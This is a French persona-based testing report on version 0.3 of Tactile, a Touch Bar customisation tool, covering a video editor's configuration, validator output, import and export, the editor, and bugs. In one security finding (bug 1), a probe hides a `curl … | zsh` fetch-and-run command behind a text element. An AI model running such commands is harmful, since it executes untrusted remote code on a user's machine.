# Retour de Lise sur la 0.3 (main) : je désinstalle BetterTouchTool ?

Persona : Lise, 29 ans, monteuse vidéo, MacBook Pro 16" 2019 (Intel, Touch Bar), clavier AZERTY, quatre ans de BetterTouchTool. Suite de [mon retour sur la 0.2](../0.2/lise-btt.md). Je suis en semaine d'essai.

## Contexte

- Dépôt : `main` à `9e559e6`, section `Unreleased` du `CHANGELOG.md` (après la 0.2.0).
- Lu : `CHANGELOG.md`, `README.fr.md`, `docs/ARCHITECTURE.md` (section éditeur), `exemples/{vitrine,lanceur,meteo,mcp,par-application}.toml`, `exemples/mcp/horloge-mcp.py`, `src/config.rs`, `src/actions/mod.rs`, `src/sources/mod.rs`, `src/barre/elements.rs`, `src/editeur/partage.rs`, `src/editeur/editeur.html`.
- Compilé avec `mise exec -- cargo build --release -q`. Tout tourne avec un `HOME` factice et `TACTILE_CONFIG` dans le scratchpad (`…/scratchpad/lise3/`). **Je n'ai pas lancé la barre** : ce qui se passe au toucher est déduit du code. L'éditeur a tourné seul (`--personnaliser`), piloté par `TACTILE_EDITEUR_JS`, puis arrêté par son PID.
- Aucune app de montage n'est installée sur cette machine (ni Resolve, ni Final Cut Pro, ni Compressor, ni Motion) : bon test du cas « app absente ».
- Fichiers : `…/scratchpad/lise3/barre-monteuse.toml` (la barre), `premier-jet.toml` (avant correction de largeur), `sondes/30…41`, `export/lise.zip` et `export/lise.toml`, `editeur/*.png` (captures), `editeur/pilote.js`, `editeur/pilote2.js`, `editeur/sortie*.log`.
- Les 28 sondes de la 0.2 (`…/scratchpad/lise2/sondes/`) ont été rejouées sur ce binaire.

## Ses blocages 0.2 : état

| # | Blocage 0.2 | État | Preuve |
|---|---|---|---|
| 1 | AZERTY : chiffres vers le pavé, `cmd+\` introuvable, `keycode` sans modificateur | **Levé** | `ARCHITECTURE.md`, pièges : un chiffre vise la rangée du haut, `\` reçoit ⌥⇧. `shift+4`…`shift+8` et `cmd+\` passent dans ma barre Resolve ; `touche = "shift+keycode:22"` passe (sonde 30). Je n'ai pas pu appuyer pour voir Resolve changer de page. |
| 1b | `cmd++` refusé avec `modificateur inconnu «  »` | **Toujours là** | sonde 03, même message mot pour mot |
| 2 | Pas de `barre = "apple"` ni de liste d'apps | **Toujours là** | sonde 01 : `type invalide : une liste, attendu un texte` ; sonde 02 : `champ inconnu «barre»` |
| 3 | Erreurs mal situées, `[[element]]` égaré, largeur des barres d'app | **Levé** | sonde 25 : ligne 13 (début du bloc fautif), plus la ligne 7 ; sonde 26 : l'erreur de la principale sort en premier ; `premier-jet-element-egare.toml` : `attention : ligne 139 : cet [[element]] est écrit après un [[application]] […] voulais-tu [[application.element]] ?` ; le débordement est calculé par barre (`controler`, `deborde` sur `elements_avec`) |
| 3b | `--verifier` muet sur symbole, image, app, couleur | **Levé** | sondes 10 à 13 et 24 : chacune donne une ligne `attention :`. Reste muet : AppleScript faux (sonde 14), et le même app sous deux noms (`Finder` et `com.apple.finder`, sonde 22) ; deux fois le même nom est détecté (sonde 32). |
| 3c | Messages à moitié traduits | **Levé** | `type invalide : une liste, attendu un texte`, `1 élément` |
| 4 | Pas d'import BTT | **Toujours là** | aucune occurrence de `bttpreset` dans `src/`. L'export / import Tactile → Tactile existe, et c'est déjà ça pour mes collègues si je leur prépare la barre. |
| 5 | Pas testé sur un vrai Intel | **Toujours là** | `README.fr.md` : « testée sous Rosetta, pas encore sur un vrai Mac Intel » |
| — | Groupe sans `image` ni `couleur` ; `batterie` sans seuil ; pas d'appui long sur `script` | Toujours là | sondes 07, 08, 18, 09. Le seuil de couleur se fait maintenant avec une `[[source]]` + `couleur_selon`, c'est propre. |

Trois blocages sur cinq sont levés, dont les deux qui me faisaient douter de ma barre en séance (AZERTY et erreurs mal situées).

## Sa barre

Ce que j'ai ajouté depuis la 0.2 :

- **Tiroir de montage** : un `groupe` `film.stack` avec quatre `lanceur` (Resolve par bundle id, Final Cut Pro, Compressor, Motion) et, pour voir, un `texte` MCP dedans.
- **Raccourcis système** : `capture_zone` (appui long `capture_options`), `mission_control` (appui long `fenetres_app`).
- **Sources** : `disque` (commande `df` → `{"libre": 90}`, rouge sous 10 % par `couleur_selon`, toucher = réglages Stockage), `meteo` (Open-Meteo en https), `horloge` (MCP, `exemples/mcp/horloge-mcp.py`, outil `heure`).
- **Resolve** : les vrais raccourcis (`shift+4`…`shift+8`, `cmd+\`), la page Montage en plus, le disque en texte à droite.
- **Final Cut Pro** : `herite = true`, Compressor en lanceur dans le groupe Export.

### Le fichier

```toml
# Barre de Lise, monteuse. Tactile main (Unreleased après 0.2.0).
# Principale hors montage ; DaVinci Resolve et Final Cut Pro ont la leur.
# Clavier : AZERTY (French). Raccourcis : ceux d'usine de Resolve 19 et FCP 11.

masquer_control_strip = true

# ───────────── Barre principale ─────────────

[[element]]
type = "bouton"
symbole = "apple.logo"
largeur = 56
action = "barre_apple"

[[element]]
type = "bouton"
texte = "esc"
largeur = 56
action = "echap"

[[element]]
type = "groupe"
symbole = "speaker.wave.2.fill"
  [[element.element]]
  type = "slider"
  reglage = "volume"

  [[element.element]]
  type = "slider"
  reglage = "luminosite"

  [[element.element]]
  type = "bouton"
  symbole = "speaker.slash.fill"
  action = "basculer_muet"

[[element]]
type = "souple"

# Le tiroir de montage : les vraies icônes, un point sous celles qui tournent.
[[element]]
type = "groupe"
symbole = "film.stack"
largeur = 56
  [[element.element]]
  type = "lanceur"
  app = "com.blackmagic-design.DaVinciResolve"
  texte = "Resolve"

  [[element.element]]
  type = "lanceur"
  app = "Final Cut Pro"

  [[element.element]]
  type = "lanceur"
  app = "Compressor"

  [[element.element]]
  type = "lanceur"
  app = "Motion"

  [[element.element]]
  type = "texte"
  source = "horloge"
  gabarit = "MCP {heure}"
  largeur = 130

[[element]]
type = "bouton"
texte = "Frame.io"
symbole = "link"
couleur = "#5B53FF"
couleur_texte = "#FFFFFF"
affichage = "icone"
largeur = 56
action = { url = "https://next.frame.io" }

[[element]]
type = "bouton"
symbole = "camera.viewfinder"
largeur = 56
action = "capture_zone"
appui_long = "capture_options"

[[element]]
type = "bouton"
symbole = "rectangle.3.group"
largeur = 56
action = "mission_control"
appui_long = "fenetres_app"

[[element]]
type = "bouton"
symbole = "trash"
largeur = 56
appui_long = { applescript = 'tell application "Finder" to empty trash' }

[[element]]
type = "en_cours"
largeur = 120

[[element]]
type = "souple"

# Disque : la source donne {"libre": 91} ; rouge sous 10 %.
[[element]]
type = "texte"
source = "disque"
gabarit = "{libre} %"
largeur = 80
symbole_selon = { champ = "libre", defaut = "internaldrive" }
couleur_selon = { champ = "libre", seuils = [10], couleurs = ["#B00020", "#3A3A3C"] }
action = { url = "x-apple.systempreferences:com.apple.settings.Storage" }

[[element]]
type = "texte"
source = "meteo"
gabarit = "{current.temperature_2m} °C"
largeur = 96
symbole_selon = { champ = "current.weather_code", defaut = "cloud.sun.fill", valeurs = { "0" = "sun.max.fill", "1" = "sun.max.fill", "2" = "cloud.sun.fill", "3" = "cloud.fill", "61" = "cloud.rain.fill", "63" = "cloud.rain.fill", "65" = "cloud.heavyrain.fill", "71" = "cloud.snow.fill", "95" = "cloud.bolt.rain.fill" } }

[[element]]
type = "batterie"
largeur = 90

[[element]]
type = "heure"
format = "HH:mm"

# ───────────── Sources ─────────────

[[source]]
nom = "disque"
commande = '''df -k / | awk 'NR==2 { printf "{\"libre\": %d}\n", $4 / $2 * 100 }' '''
toutes_les = 120

[[source]]
nom = "meteo"
http = "https://api.open-meteo.com/v1/forecast?latitude=48.85&longitude=2.35&current=temperature_2m,weather_code"
toutes_les = 600

[[source]]
nom = "horloge"
mcp = { commande = "/usr/bin/python3 ~/code/tactile/exemples/mcp/horloge-mcp.py", outil = "heure" }
toutes_les = 5

# ───────────── DaVinci Resolve ─────────────

[[application]]
app = "com.blackmagic-design.DaVinciResolve"

[[application.element]]
type = "bouton"
texte = "esc"
largeur = 50
action = "echap"

# Pages : en 0.2 il fallait shift+( etc. ; maintenant un chiffre vise la rangée du haut.
[[application.element]]
type = "groupe"
texte = "Pages"
largeur = 80
  [[application.element.element]]
  type = "bouton"
  texte = "Montage"
  action = { touche = "shift+4" }

  [[application.element.element]]
  type = "bouton"
  texte = "Fusion"
  action = { touche = "shift+5" }

  [[application.element.element]]
  type = "bouton"
  texte = "Couleur"
  action = { touche = "shift+6" }

  [[application.element.element]]
  type = "bouton"
  texte = "Fairlight"
  action = { touche = "shift+7" }

  [[application.element.element]]
  type = "bouton"
  texte = "Livrer"
  action = { touche = "shift+8" }

[[application.element]]
type = "souple"

[[application.element]]
type = "bouton"
symbole = "cursorarrow"
largeur = 50
action = { touche = "a" }

[[application.element]]
type = "bouton"
symbole = "scissors"
largeur = 50
action = { touche = "b" }

# Le vrai raccourci de Resolve, enfin.
[[application.element]]
type = "bouton"
texte = "Couper"
couleur = "#7A2E2E"
largeur = 70
action = { touche = "cmd+\\" }

[[application.element]]
type = "bouton"
symbole = "delete.left"
largeur = 50
action = { touche = "shift+suppr" }

[[application.element]]
type = "bouton"
symbole = "bookmark.fill"
couleur = "#2E5C7A"
largeur = 50
action = { touche = "m" }

[[application.element]]
type = "bouton"
symbole = "backward.fill"
largeur = 44
action = { touche = "j" }

[[application.element]]
type = "bouton"
symbole = "stop.fill"
largeur = 44
action = { touche = "k" }

[[application.element]]
type = "bouton"
symbole = "forward.fill"
largeur = 44
action = { touche = "l" }

[[application.element]]
type = "bouton"
symbole = "minus.magnifyingglass"
largeur = 44
action = { touche = "cmd+-" }

[[application.element]]
type = "bouton"
symbole = "plus.magnifyingglass"
largeur = 44
action = { touche = "cmd+=" }
appui_long = { touche = "shift+z" }

[[application.element]]
type = "souple"

[[application.element]]
type = "texte"
source = "disque"
gabarit = "{libre} %"
largeur = 70
couleur_selon = { champ = "libre", seuils = [10], couleurs = ["#B00020", "#3A3A3C"] }

[[application.element]]
type = "batterie"
symbole = false
largeur = 80

[[application.element]]
type = "heure"
format = "HH:mm"

# ───────────── Final Cut Pro ─────────────

[[application]]
app = "com.apple.FinalCut"
herite = true

[[application.element]]
type = "bouton"
symbole = "scissors"
largeur = 50
action = { touche = "b" }

[[application.element]]
type = "bouton"
texte = "Couper"
couleur = "#7A2E2E"
largeur = 64
action = { touche = "cmd+b" }

[[application.element]]
type = "bouton"
symbole = "bookmark.fill"
couleur = "#2E5C7A"
largeur = 50
action = { touche = "m" }
appui_long = { touche = "alt+m" }

[[application.element]]
type = "bouton"
symbole = "backward.fill"
largeur = 44
action = { touche = "j" }

[[application.element]]
type = "bouton"
symbole = "stop.fill"
largeur = 44
action = { touche = "k" }

[[application.element]]
type = "bouton"
symbole = "forward.fill"
largeur = 44
action = { touche = "l" }

[[application.element]]
type = "groupe"
texte = "Export"
symbole = "square.and.arrow.up"
largeur = 64
  [[application.element.element]]
  type = "bouton"
  texte = "Partager"
  action = { touche = "cmd+e" }

  [[application.element.element]]
  type = "lanceur"
  app = "Compressor"
```

### `--verifier`

Premier jet (`en_cours` à 180 pt, Frame.io avec son texte) :

```
attention : la barre principale déborde (environ 1163 pt pour 1004) : 2 éléments sur 15 seront cachés ; réduis des largeurs ou retire un élément
OK : 15 éléments, 2 barres d'application
```

Exactement ce que je demandais en 0.2. Après `en_cours` à 120 et Frame.io en icône seule :

```
$ tactile --verifier barre-monteuse.toml
attention : ligne 46 : app « com.blackmagic-design.DaVinciResolve » introuvable : le lanceur affichera son nom en texte ; écris le nom du dossier .app sans l'extension, ou son bundle id
attention : ligne 51 : app « Final Cut Pro » introuvable : le lanceur affichera son nom en texte ; écris le nom du dossier .app sans l'extension, ou son bundle id
attention : ligne 55 : app « Compressor » introuvable : le lanceur affichera son nom en texte ; écris le nom du dossier .app sans l'extension, ou son bundle id
attention : ligne 59 : app « Motion » introuvable : le lanceur affichera son nom en texte ; écris le nom du dossier .app sans l'extension, ou son bundle id
attention : ligne 153 : app « com.blackmagic-design.DaVinciResolve » introuvable : ni un bundle id (com.apple.Safari) ni le nom d'une app installée
attention : ligne 280 : app « com.apple.FinalCut » introuvable : ni un bundle id (com.apple.Safari) ni le nom d'une app installée
attention : ligne 333 : app « Compressor » introuvable : le lanceur affichera son nom en texte ; écris le nom du dossier .app sans l'extension, ou son bundle id
OK : 15 éléments, 2 barres d'application
```

Le résumé compte enfin les barres d'app.

### Une app de montage absente : ce que fait Tactile

- `--verifier` prévient pour chaque lanceur et chaque `[[application]]`, sans refuser (code 0). Bien.
- Dans la barre (`elements.rs`, `Icone::repli`) : un lanceur sans app affiche son `texte` s'il en a un (« Resolve »), sinon la chaîne `app` telle quelle. Pour Resolve sans `texte`, j'aurais eu `com.blackmagic-design.DaVinciResolve` en toutes lettres sur la Touch Bar ; d'où mon `texte = "Resolve"`. Au toucher, `open -b` échoue et l'erreur part au journal, rien à l'écran.
- La barre `[[application]]` d'une app absente ne s'affiche jamais, sans gêner.
- Le conseil du message est faux pour un bundle id juste d'une app pas encore installée : « écris le nom du dossier .app sans l'extension, ou son bundle id », alors que c'est justement un bundle id. Ça pousse à « corriger » une ligne correcte.
- Dans l'éditeur, le lanceur absent a une tuile vide dans la liste du groupe et « Aucune application « com.blackmagic-design.DaVinciResolve » sur ce Mac ».

### Les sources testées à la main

```
$ zsh -c '<commande de la source disque>'
{"libre": 90}
$ (server/discover puis tools/call heure) | python3 exemples/mcp/horloge-mcp.py
{"jsonrpc": "2.0", "id": 2, "result": {"content": [{"type": "text", "text": "{\"heure\": \"18:36:17\"}"}]}}
```

Le `~` du chemin MCP est développé par zsh à l'exécution : avec un autre HOME, la source serait vide et `--verifier` ne le dit pas (il ne vérifie pas la commande, ce qui se comprend).

Sondes sur les sources : nom de source mal tapé (`attention : ligne 1 : aucune [[source]] ne s'appelle « disk » : l'élément affichera ⚠ source`), deux modes ou aucun (erreur, code 1), `http://` (avertissement), `toutes_les = 2` (ramené à 5), `couleur_selon` incohérent, gabarit sans source : tout est signalé. Une source que rien n'affiche passe sans un mot (sonde 37) et tourne quand même.

### Export et import

```
$ tactile --exporter export/lise.zip
OK: bar exported to export/lise.zip
$ tactile --exporter export/lise.toml
OK: bar exported to export/lise.toml
```

Le `.toml` est mon fichier à l'octet près. Le `.zip` (sans logo, un seul `barre.toml`) est réécrit : commentaires perdus, `gabarit = false` et `56.0` ajoutés, sinon identique (comparaison `tomllib` : seuls `valeurs = {}` et `herite = false` explicites apparaissent).

Import sans `--oui` (dans un tuyau, sans terminal) :

```
Bar from export/lise.zip: 15 items, 2 app bars (com.blackmagic-design.DaVinciResolve, com.apple.FinalCut).
What it can run on your Mac:
  Main bar, item 5 › 1 · Opens the app: com.blackmagic-design.DaVinciResolve
  Main bar, item 5 › 2 · Opens the app: Final Cut Pro
  Main bar, item 5 › 3 · Opens the app: Compressor
  Main bar, item 5 › 4 · Opens the app: Motion
  Main bar, item 7 · Screenshots an area (simulates ⌘⇧4): capture_zone
  Main bar, item 7 · Opens the screenshot tool (long press): capture_options
  Main bar, item 8 · Opens Mission Control: mission_control
  Main bar, item 8 · Shows the app’s windows (Mission Control) (long press): fenetres_app
  Main bar, item 9 · AppleScript (long press): tell application "Finder" to empty trash
  “com.blackmagic-design.DaVinciResolve” bar, item 2 › 1 “Montage” · Keyboard shortcut: shift+4
  […] 24 autres lignes « Keyboard shortcut » (Resolve et Final Cut Pro) […]
  “com.apple.FinalCut” bar, item 7 › 2 · Opens the app: Compressor
  “disque” source · Command run every 120 s: df -k / | awk 'NR==2 { printf "{\"libre\": %d}\n", $4 / $2 * 100 }'
  “meteo” source · Address fetched every 600 s: https://api.open-meteo.com/v1/forecast?latitude=48.85&longitude=2.35&current=temperature_2m,weather_code
  “horloge” source · MCP server started (tool “heure”): /usr/bin/python3 ~/code/tactile/exemples/mcp/horloge-mcp.py
warning: ligne 47 : app « com.blackmagic-design.DaVinciResolve » introuvable : […]
[…] 6 autres warnings […]
tactile: no terminal to confirm; run again with --yes to replace your bar.
(code 1, barre inchangée)
```

Avec `--oui` :

```
OK: bar installed in …/home/.config/tactile/barre.toml. The old one is kept in …/home/.config/tactile/barre.toml.precedent.
```

Mon jugement sur la liste :

- **Ce qui est bien** : les trois sources sont en fin de liste avec leur commande entière, le serveur MCP qui sera *lancé* est nommé comme tel, l'AppleScript est en clair. Refuser sans terminal plutôt que d'accepter par défaut, c'est le bon choix.
- **Ce qui manque** : l'action du `texte` disque (`x-apple.systempreferences:…`) n'y est pas. Pire, une action `shell` sur un `texte` n'y est pas non plus (bug 1).
- **Le bruit** : 26 lignes de raccourcis sur 38. J/K/L, `a`, `b`, `m` ne font courir aucun risque, et ils noient les 4 lignes qui comptent (AppleScript, commande, MCP, adresse). Une collègue qui reçoit ma barre va survoler.
- **Les langues** : cadre en anglais (le système de test est en `en_US`), avertissements en français précédés de `warning:`. Et les numéros de ligne renvoient au `barre.toml` réécrit dans le zip (ligne 47), pas à mon fichier (ligne 46) : la personne qui importe ne voit pas ce fichier.
- Importer un `.toml` le réécrit aussi : mes commentaires AZERTY ne survivent pas à un import, même du `.toml` exporté à l'identique.

## Éditeur : ce qu'il gère et ce qu'il perd

Ouvert sur ma barre commentée, piloté, captures dans `…/lise3/editeur/`.

**Ce qu'il montre et règle** (`01-ouverture.png`, `02-tiroir.png`, `05-texte-disque.png`) :

- La barre principale entière à l'échelle : tiroir `film.stack`, Frame.io en violet, capture, Mission Control, corbeille, titre en cours, disque « — % » avec son symbole, météo « — °C » avec le sien, batterie, heure.
- Le tiroir : symbole, largeur, liste du contenu (« Lanceur d'app · Resolve », « Final Cut Pro », « Compressor », « Motion », « Texte ») avec « Régler » sur chacun.
- Un lanceur : app, Choisir…, vérification (« Aucune application … sur ce Mac »), texte, affichage, largeur, appui long.
- Les actions système dans la liste des actions d'un bouton.
- Un `texte` : **source** (champ libre), **gabarit**, **largeur**. C'est tout.

**Ce qu'il ne montre pas** (mais garde : après une retouche et Enregistrer, le fichier a toujours 2 barres d'app de 17 et 7 éléments, 3 sources, et `couleur_selon`, `symbole_selon` et `action` du disque ; `barre.toml.manuel` garde mes commentaires) :

- **Les barres par application** : rien dans la page ne dit qu'elles existent. Pas le mot « Resolve », pas « Final Cut » (texte de la page relu par le pilote : `application=false resolve=false final cut=false`). Les deux tiers de mon travail sont invisibles.
- **Les sources** : aucune liste, ni création, ni modification. Le champ Source est un texte libre, sans menu des sources existantes.
- `couleur_selon`, `symbole_selon` et l'**action** d'un `texte` : ni affichés ni réglables.
- On ne peut pas **ajouter** un `texte` : absent de la colonne « Ajouter » et de « Ajouter dans le groupe… ».

**Ce qu'il perd** : une barre toute faite. Sur ma barre, « Simple » puis Enregistrer garde mes 2 barres d'app mais **efface mes 3 sources** (pilote : `apps=2 sources=0`). Ma barre Resolve cite toujours `disque` : après coup, `--verifier` dit `attention : ligne 194 : aucune [[source]] ne s'appelle « disque » : l'élément affichera ⚠ source`. L'éditeur a enregistré sans prévenir (bug 2). `Revenir` me sauve, encore faut-il savoir pourquoi la barre Resolve affiche « ⚠ source ».

Bilan : pour la barre principale, l'éditeur est devenu agréable. Pour ce qui me distingue de BTT (barres par app, sources), il ne sert qu'à ne pas casser, et dans un cas il casse.

## Bugs

### 1. L'import ne liste pas l'action d'un élément `texte` (gravité : haute, sécurité)

- Étapes : `sondes/41-texte-action-cachee.toml`, un `texte` avec `action = { shell = "curl -s https://exemple.invalid/x.sh | zsh" }` ; `tactile --importer sondes/41-texte-action-cachee.toml`.
- Attendu : une ligne « Shell command : curl … | zsh » dans « What it can run on your Mac ».
- Obtenu : seule la commande de la source est listée. L'action est bien exécutée au toucher (`elements.rs`, `Element::Texte` → `bouton_texte(etat, action.clone())`).
- Cause : `partage.rs::parcourir` traite `Bouton`, `Lanceur`, `Script`, `Groupe` ; `_ => {}` pour le reste, donc `Texte { action }` passe. L'éditeur, qui ne montre pas cette action non plus, ne rattrape rien.

### 2. Une barre toute faite efface les `[[source]]` mais garde les `[[application]]` qui les citent (gravité : moyenne)

- Étapes : éditeur sur ma barre, « Simple », confirmer, Enregistrer (`editeur/pilote2.js`).
- Attendu : garder mes sources comme mes barres d'app, ou au moins prévenir.
- Obtenu : `sources=0`, fichier enregistré, la barre Resolve affichera « ⚠ source ».
- Cause : `editeur/mod.rs`, `Barre { applications, ..b }` : seules les applications sont reprises.

### 3. Le même app sous deux noms n'est pas détecté (gravité : basse)

- Étapes : sonde 22 (`app = "Finder"` puis `app = "com.apple.finder"`).
- Attendu : « a déjà sa barre ».
- Obtenu : `OK : 1 élément, 2 barres d'application`. La seconde ne sera jamais montrée. Avec deux fois le même texte (sonde 32), l'avertissement sort.

### 4. Conseil trompeur pour un bundle id d'app absente (gravité : basse)

- Étapes : lanceur `app = "com.blackmagic-design.DaVinciResolve"` sur un Mac sans Resolve.
- Obtenu : « écris le nom du dossier .app sans l'extension, ou son bundle id ».
- Attendu : quand la chaîne a la forme d'un bundle id, dire « aucune app installée avec ce bundle id ; le lanceur affichera "texte" ou cette chaîne ».

### 5. Import : lignes d'un fichier que l'utilisateur ne voit pas, deux langues mêlées (gravité : basse)

- Les `warning: ligne 47` de `--importer` d'un `.zip` renvoient au `barre.toml` réécrit dans l'archive ; mon fichier a l'élément à la ligne 46. Le cadre suit la langue du système, les avertissements restent en français avec un préfixe anglais.

### Limites connues, pas des bugs

- `cmd++` refusé avec `modificateur inconnu «  »` (sonde 03), inchangé depuis la 0.2.
- Importer, même un `.toml`, réécrit le fichier sans commentaires.
- Une source sans élément tourne quand même, sans avertissement (sonde 37).

## Tableau comparatif BTT à jour

**Oui** = fait et visible dans le code ; **Partiel** = détour ou limites ; **Non** = absent. ↑ = progrès depuis mon retour 0.2.

| Fonction BTT | 0.2 | main (0.3) | Preuve | Importance |
|---|---|---|---|---|
| Bouton texte + icône + couleur | Oui | Oui | `config.rs` `Element::Bouton` | 5 |
| Icône personnalisée (PNG, logo) | Oui | Oui ↑ (choisir ou glisser dans l'éditeur, SVG/PDF convertis ; toujours pas sur un groupe) | `editeur/icones.rs` ; sonde 07 | 4 |
| **Lanceur d'app avec vraie icône et point « ouverte »** | Partiel (bouton `app`) | **Oui** ↑ | `Element::Lanceur` ; `elements.rs::marquer_lanceurs` | 4 |
| Tiroir d'apps | Partiel | **Oui** ↑ (groupe de lanceurs) | `exemples/lanceur.toml` | 3 |
| **Barre différente selon l'app** | Oui | Oui (une app par bloc, `herite` tout ou rien) | `Application` ; sondes 01, 02 | **5** |
| Garder la barre d'Apple dans certaines apps | Partiel | Partiel | sonde 02 | 4 |
| **Raccourci clavier** | Oui (trous AZERTY) | **Oui** ↑ (AZERTY réglé ; pas de `cmd++`) | `clavier.rs` ; sondes 03, 30 | **5** |
| Touche par code avec modificateurs | Partiel | **Oui** ↑ (`shift+keycode:22`) | sonde 30 | 3 |
| Actions système (Mission Control, capture, Spotlight, verrouiller…) | Non | **Oui** ↑ (11 actions) | `actions/mod.rs` | 4 |
| Lancer une app, ouvrir une URL, AppleScript | Oui | Oui | `actions/mod.rs` | 4 |
| Widget shell à intervalle | Oui | Oui | `Element::Script` | 5 |
| Widget qui change icône et couleur | Oui (JSON) | **Oui** ↑ (aussi `symbole_selon`, `couleur_selon` déclaratifs) | `sources/mod.rs` | 4 |
| **Météo prête à l'emploi** | Partiel (script) | **Oui** ↑ (source `http`, exemple Open-Meteo, clé au trousseau) | `exemples/meteo.toml` ; `sources/http.rs` | 3 |
| Données d'un outil MCP | — | **Oui** (stdio et HTTP) | `sources/mcp.rs` | 2 |
| Batterie : %, seuil rouge, minutes | Oui / Non / Non | Oui / Partiel (via source + `couleur_selon`) / Non | sonde 18 | 3 |
| Date / heure | Oui | Oui | `Element::Heure` | 4 |
| Now Playing : titre / pochette | Oui / Non | Oui / Non | `rafraichi.rs` | 3 |
| Groupe pliable | Oui (ni image ni couleur) | Oui (idem) | sondes 07, 08 | 4 |
| Appui long | Oui (boutons) | Oui (boutons et lanceurs ; pas `script` ni `texte`) | sonde 09 | 3 |
| Sliders en ligne | Partiel | Partiel | `elements.rs::slider` | 3 |
| Gestes, maintenir une touche (K+L) | Non | Non | `README.fr.md`, Limites | 3 |
| Macro (plusieurs actions) | Non | Non | sonde 19 | 2 |
| Barre alternative ⇧ / ⌥ | Non | Non | `config.rs` | 3 |
| Éditeur visuel | Partiel | **Partiel** ↑ pour la principale (lanceurs, logos, actions système, texte) ; barres par app et sources invisibles ; barre toute faite = sources perdues | captures `editeur/*.png` ; bug 2 | 3 |
| Vérifier sans charger | Partiel | **Oui** ↑ (symbole, couleur, image, app, débordement par barre, élément égaré, sources) | sondes 10-13, 24, 31-38 | 4 |
| Exporter / partager une barre | Non | **Oui** ↑ (`.zip` avec logos, aperçu de ce qu'elle lance) ; liste incomplète (bug 1) et bavarde | `editeur/partage.rs` | 4 |
| **Import de presets BTT** | Non | **Non** | rien dans `src/` | **5** pour mes collègues, 1 pour moi |
| Rechargement à chaud | Oui | Oui (< 300 ms) | `CHANGELOG` | 4 |
| Mac Intel testé en vrai | Non | Non | `README.fr.md` « Vérifié sur » | 4 |

Neuf lignes montent. Ce qui manque encore à BTT pour moi : barre d'Apple par app, gestes et touche maintenue, pochette. Pour mes collègues : l'import BTT.

## Verdict

**Je quitte BTT aujourd'hui et je le retire des éléments de connexion. Je le désinstalle vendredi, à la fin de ma semaine d'essai, si Tactile tient sur mon Intel en séance.** Je garde mon export `.bttpreset` au cas où.

En 0.2, j'avais deux raisons de ne pas faire confiance à ma barre en séance : les raccourcis AZERTY et les erreurs mal situées. Elles sont réglées. Ce que j'ai ajouté cette fois (tiroir de montage, capture, Mission Control, disque, météo) me donne une barre plus riche que celle de BTT, écrite en une demi-heure, et `--verifier` m'a dit avant le lancement que deux éléments seraient cachés. BTT ne me l'a jamais dit.

Ce qui reste, dans l'ordre :

1. **Le vrai Mac Intel.** Personne ne l'a vu tourner sur un vrai Intel, et je n'ai pas vu la barre non plus : cette semaine sert à ça.
2. **Pas de barre d'Apple automatique par app** ni de liste d'apps. Je vis avec le bouton `barre_apple`, mais dans Safari et Mail BTT faisait mieux.
3. **L'éditeur ne montre pas mes barres par app ni mes sources**, et une barre toute faite efface mes sources. Je retouche donc à la main, ce qui me va ; ça ne va pas aux deux collègues que j'aimerais convaincre.
4. **Pas d'import BTT**, pour elles aussi. L'export `.zip` me permet de leur préparer une barre, à condition que la liste des commandes soit complète (bug 1) avant que je leur demande de faire confiance à un fichier.

## 3 propositions

### 1. Une liste des commandes complète, et triée par risque

- Parcourir *chaque* élément qui porte une action : ajouter `Texte { action }` à `partage.rs::parcourir` (et à tout futur type avec `action`), avec un test qui vérifie que chaque variante d'`Element` portant une `Action` sort dans `commandes`.
- Deux blocs : « Peut exécuter du code » (shell, AppleScript, commande, script, serveur MCP, adresse non web) en haut ; « Tape des raccourcis / ouvre des apps » replié en dessous, avec un total (« 26 raccourcis clavier »).
- Les numéros de ligne de l'import d'un zip remplacés par « barre Resolve, élément 6 », comme dans la liste.

### 2. L'éditeur montre ce qu'il garde

- Un sélecteur de barre au-dessus de l'aperçu : « Principale · DaVinci Resolve · Final Cut Pro », même en lecture seule au début, avec l'aperçu `elements_avec` (les éléments hérités grisés).
- Une section « Sources » dans la colonne : nom, type (http / commande / MCP), intervalle, dernière valeur lue ou erreur ; le champ Source d'un `texte` devient un menu de ces noms. Et « Texte » dans « Ajouter ».
- Une barre toute faite garde `sources` comme `applications`. Si un élément gardé cite une source disparue, refuser l'enregistrement avec le message de `--verifier`.

### 3. Les deux manques de la 0.2, qui restent

```toml
[[application]]
app = ["com.apple.Safari", "com.apple.mail", "com.apple.finder"]
barre = "apple"

[[application]]
app = ["com.blackmagic-design.DaVinciResolve", "com.apple.FinalCut"]
herite = ["batterie", "heure"]
```

Plus `cmd+plus` (ou `cmd++` reconnu), et la détection d'une app déclarée sous son nom et sous son bundle id (résoudre les deux par LaunchServices quand l'app est installée).
